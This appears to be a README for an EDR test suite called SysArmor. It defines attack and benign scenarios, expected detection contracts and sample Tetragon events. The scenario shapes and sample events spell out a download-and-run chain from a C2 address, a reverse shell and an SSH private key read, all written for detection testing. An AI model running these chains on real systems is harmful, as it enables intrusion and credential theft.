# SysArmor Scenario Contracts

`scenarios/` 定义功能场景的输入和期望输出。它和 `workloads/` 的边界很重要:

- `scenarios/` 是安全/功能契约,带攻击或良性语义,必须断言 Event、Signal、Incident、Evidence 或负向条件;
- `workloads/` 是压力源,用于性能评估,不直接声明安全结论。

每个场景目录通常包含:

```text
test/scenarios/<topology>/<scenario>/
├── attack.sh        scenario input, executed inside node-a
└── expected.yaml    expected output contract
```

容器拓扑通常通过 `docker exec node-a ...` 触发。VM 拓扑通常通过 `vagrant ssh node-a ...` 触发。两种拓扑应尽量产出结构一致的 Event/Signal/Incident。

## Scenario Matrix

| Scenario | Type | Core Question | Expected |
|---|---|---|---|
| `apt-fileless-c2` | positive attack | 单 lineage 内的下载、执行、反弹 shell、凭据读取能否被端侧串起来 | endpoint terminal signal, incident=1 |
| `apt-staged-drop` | positive cross-lineage attack | 落盘和执行分属不同 lineage 时,云端 provenance graph 能否缝合 | endpoint terminal=0, incident=1 |
| `benign-ci-noise` | negative benign baseline | curl、编译、写 artifact 与攻击形态相似时是否不误报 | incident=0 |
| `lifecycle-smoke` | lifecycle smoke | agent 注册、policy、基础事件可见性是否正常 | agent visible, events visible |

这三个安全场景构成最小完备集:

```text
apt-fileless-c2  -> 正向检出:有攻击应响
apt-staged-drop  -> 横向能力:跨 lineage 才能成案
benign-ci-noise  -> 负向基线:相似良性行为不应误报
```

## Common Inputs

### Environment

| Input | Location | Role |
|---|---|---|
| container compose | `test/env/container/compose.yaml` | attacker/node-a/mgr/tetragon Docker topology |
| VM topology | `test/env/vm/Vagrantfile` | attacker/node-a VM topology |
| container images | `test/env/container/images/` | attacker C2, node-a workload host, mgr image |
| VM provision | `test/env/vm/provision/` | C2 setup, credentials setup |
| tracing policy | `test/env/resources/syscall-capture.yaml` | replay/debug/perf compatible Tetragon policy |
| fake token | `test/env/resources/registry-token` | benign/credential test material |

### Policy And Content

Scenario assertions may use local generated policies, collection policy files from `test/policies/`, and content packs from `test/content/`.

Important collection profiles:

| Policy | Purpose |
|---|---|
| `collection-minimal-high-signal.json` | low-cost high-confidence surface |
| `collection-edr-balanced.json` | default long-running EDR surface |
| `collection-incident-deep.json` | short-lived investigation surface |
| `collection-debug-wide.json` | broad debug/capability surface |

Important content packs:

```text
context-credential-path-prefixes.json
context-payload-path-prefixes.json
context-persistence-path-prefixes.json
context-secret-volume-prefixes.json
ioc-c2-ip-feed.json
ioc-c2-port-feed.json
rulepack-cep-endpoint.json
```

### Legacy TracingPolicy Shape

`test/env/resources/syscall-capture.yaml` is still useful for replay/debug/perf-compatible paths. It focuses on network connect and sensitive file read:

```yaml
spec:
  kprobes:
  - call: "security_socket_connect"
    args: [sockaddr, int]

  - call: "security_file_permission"
    return: true
    args: [file, int]
```

Together with process exec/exit, this gives the basic behavior axes:

```text
process lineage
network socket
credential / sensitive file
```

The newer agent-owned path compiles collection policies into runtime sensor intent, but the same scenario semantics should remain stable.

## Scenario Details

### apt-fileless-c2

Shape:

```text
java-web or shell entry
  -> bash
  -> curl http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh
  -> bash /dev/shm/x.sh
  -> reverse shell to 10.66.0.99:443
  -> cat /root/.ssh/id_rsa
```

Security meaning:

- fileless/staged execution from temporary memory-backed path;
- C2 download and reverse shell;
- sensitive credential read;
- one lineage contains enough evidence for endpoint detection.

Expected contract:

```text
events:
  must include CONNECT 10.66.0.99:8080
  must include CONNECT 10.66.0.99:443
  should include sensitive file read when policy enables it

endpoint_signals:
  must include reverse_shell_pattern
  terminal=true

incident:
  count=1
```

Typical lineage:

```text
entrypoint/init
  -> bash
  -> curl 10.66.0.99:8080/x.sh
  -> bash /dev/shm/x.sh
  -> bash -i / reverse shell
  -> cat /root/.ssh/id_rsa
```

### apt-staged-drop

Shape:

```text
lineage A:
  bash
    -> curl http://10.66.0.99:8080/helper
    -> write /var/lib/app/plugins/helper

GAP

lineage B:
  /var/lib/app/plugins/helper --report 10.66.0.99:443
```

Security meaning:

- download/write and later execution are intentionally split;
- a single endpoint lineage should not be enough to produce a terminal conclusion;
- cloud/provenance graph should connect the two lineages via the shared file node.

Expected contract:

```text
events:
  must include helper download
  must include helper execution or report connection

endpoint_signals:
  may include non-terminal payload/drop signals
  should not require a terminal endpoint-only chain

incident:
  count=1
  lineage_ids >= 2
  evidence contains /var/lib/app/plugins/helper

control_assertions:
  disabling cloud.cross_lineage should make incident count 0
```

Typical graph:

```text
curl -> /var/lib/app/plugins/helper <- helper execution -> 10.66.0.99:443
```

### benign-ci-noise

Shape:

```text
CI/build loop x N:
  bash build.sh
    -> curl 10.66.0.99:8080 dependencies
    -> compile
    -> write artifact
```

Security meaning:

- behavior intentionally resembles attack building blocks: curl, file writes, process churn;
- repeated benign structure should reduce rarity and avoid incident creation;
- useful as false-positive and business-noise baseline.

Expected contract:

```text
events:
  may include repeated curl/connect and file activity

endpoint_signals:
  no terminal attack signal expected

incident:
  count=0

control_assertions:
  switching converge.mode=additive_threshold may produce incident>=1
```

This scenario is the main guard against a naive additive scoring model.

### lifecycle-smoke

Shape:

```text
start topology
start or connect agent
emit a small known event stream
query agent/manager status and events
```

Expected contract:

```text
lifecycle:
  agent_registered=true
  events_visible=true
  stable_id and lineage_id should exist where expected
  no panic / no OOM
```

This scenario is not a security detection test. It is a path-health smoke test.

## Expected YAML Contract

`expected.yaml` is intentionally declarative. A typical file may contain:

```yaml
events:
  must_contain:
    - { kind: CONNECT, dst: "10.66.0.99:443" }

endpoint_signals:
  must_contain:
    - { name: reverse_shell_pattern, terminal: true }

cloud_signals:
  must_contain:
    - { name: staged_payload_chain }

incident:
  count: 1
  lineage_ids_min: 2
  converge_method: "rarity+causal-topk"

negative:
  endpoint_terminal_count: 0

control_assertions:
  - disable: cloud.cross_lineage
    then_incident_count: 0
```

Current assertion layers:

| Layer | What It Checks | Main Entrypoint |
|---|---|---|
| L1 Events | raw/normalized event visibility | `suites/local-agent/capture-vm.sh`, `suites/manager-cloud/capture-container.sh`, `tools/assertions/assert.py`, `tools/assertions/assert-vm-local.sh` |
| L2 Endpoint signals | local endpoint rules and event refs | `tools/assertions/assert-vm-local.sh`, `suites/local-agent/`, `suites/agent-runtime/` |
| L3 Cloud signals | manager/analytics rule output | `tools/assertions/assert.py`, `suites/manager-cloud/` |
| L4 Incidents | convergence, evidence, lifecycle state | `suites/manager-cloud/e2e-incident*.sh`, graph/evidence e2e |
| Negative | absence of terminal signals or incidents | scenario expected files |
| Control | counterfactual behavior when a capability is disabled | `control_assertions` |

`tools/assertions/assert.py` is the generic historical assertion entrypoint.
Focused product checks live in `test/suites/<suite>/`, especially for local VM
agent paths, graph/evidence, response, agent session, and
`AgentControlPlaneService.Connect` behavior.

## Event And Signal Output

Scenario and recorder output usually lands under `test/.results/`.

Functional outputs:

```text
test/.results/
├── <topology>.<scenario>.events.ndjson
├── <topology>.<scenario>.signals.ndjson
├── <topology>.<scenario>.local.json
├── <topology>.<scenario>.linked.json
└── <topology>.<scenario>.json
```

Recorder/benchmark outputs:

```text
test/.results/recordings/<run-id>/
├── timeline.csv
├── markers.ndjson
├── events.ndjson
├── signals.ndjson
└── summary.json

test/.results/bench-collection-vm/<run-id>/
├── matrix.csv
├── matrix.json
└── <policy-name>/
    ├── summary.json
    ├── timeline.csv
    ├── events.ndjson
    ├── signals.ndjson
    ├── collection-apply.json
    ├── workload.out
    └── workload.err
```

Common raw Tetragon event shapes:

| Raw type | Meaning | Important fields |
|---|---|---|
| `process_exec` | process start | `exec_id`, `pid`, `binary`, `arguments`, `parent_exec_id`, container/host metadata |
| `process_exit` | process exit | `exec_id`, `pid` |
| `process_kprobe` | kernel probe event | `function_name`, `args`, `policy_name` |

Common normalized behavior axes:

| Behavior | Example |
|---|---|
| process lineage | bash -> curl -> helper |
| network connect | 10.66.0.99:8080 / 10.66.0.99:443 |
| file write/chmod | `/dev/shm/x.sh`, `/var/lib/app/plugins/helper` |
| file read | `/root/.ssh/id_rsa`, secret paths |

## Example Raw Events

Process lineage:

```json
{
  "process_exec": {
    "process": {
      "exec_id": "MzYyMzZmZTY1ZjVmOjIxNDc4...",
      "pid": 16783,
      "binary": "/usr/bin/bash",
      "arguments": "-c \"curl -s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh\"",
      "parent_exec_id": "MzYyMzZmZTY1ZjVmOjEyNjM4..."
    },
    "parent": {
      "pid": 14354,
      "binary": "/usr/local/bin/entrypoint.sh"
    }
  }
}
```

Network connect:

```json
{
  "process_kprobe": {
    "process": {
      "pid": 16789,
      "binary": "/usr/bin/curl",
      "arguments": "-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh"
    },
    "function_name": "security_socket_connect",
    "args": [
      { "sockaddr_arg": { "family": "AF_INET", "addr": "10.66.0.99", "port": 8080 } },
      { "int_arg": 16 }
    ],
    "policy_name": "sysarmor-syscall-capture"
  }
}
```

Sensitive file read:

```json
{
  "process_kprobe": {
    "process": {
      "pid": 16804,
      "binary": "/usr/bin/cat",
      "arguments": "/root/.ssh/id_rsa"
    },
    "function_name": "security_file_permission",
    "args": [
      { "file_arg": { "path": "/root/.ssh/id_rsa", "permission": "-rw-------" } },
      { "int_arg": 4 }
    ],
    "return": { "int_arg": 0 }
  }
}
```

## Control Assertions

Control assertions are counterfactual checks: if an important capability is disabled or swapped out, the result should change in a predictable way.

Examples:

```yaml
# benign-ci-noise: naive additive scoring should false positive
control_assertions:
  - switch: "converge.mode=additive_threshold"
    then_incident_count_min: 1
```

```yaml
# apt-staged-drop: cross-lineage graph is necessary
control_assertions:
  - disable: cloud.cross_lineage
    then_incident_count: 0
```

These assertions are useful because they prove a feature is necessary, not just present.

## Effectiveness And Efficiency

Scenario results currently provide pass/fail functional evidence. Benchmarks provide phase-level efficiency metrics. The next useful step is to merge them into a scenario effectiveness matrix:

```text
required_event_hit_rate
event_recall_by_kind
signal_hit_rate
terminal_signal_latency_ms
incident_hit_rate
incident_latency_ms
false_positive_count
drop_rate
parse_error_rate
cost_per_1k_events_cpu
```

That matrix should use:

- scenario contracts from `expected.yaml`;
- scoped event/signal frames from recorder output;
- phase markers from `markers.ndjson`;
- resource counters from `timeline.csv`;
- benchmark rows from `matrix.csv`.

This keeps scenario semantics, workload pressure, and resource cost comparable without mixing their implementation code.

Current entrypoint:

```bash
make -C test effectiveness-report TOPO=vm RUN_ID=manual
```

When used after `make -C test bench-matrix-vm`, the report is written to:

```text
test/.results/effectiveness/<run-id>/
├── summary.json
├── matrix.csv
├── policy_comparison.csv
└── policy_comparison.json
```

`summary.json` keeps per-check details derived from `expected.yaml`. `matrix.csv` keeps one row per scenario/policy with required hit rate, event hit rate, signal hit rate, observed counts, drop/parse-error rates, CPU cost per 1k events, and historical assert pass/fail counts when available.

`policy_comparison.csv` aggregates scenario effectiveness and workload resource cost per policy. It is the main table for comparing collection profiles as product options.
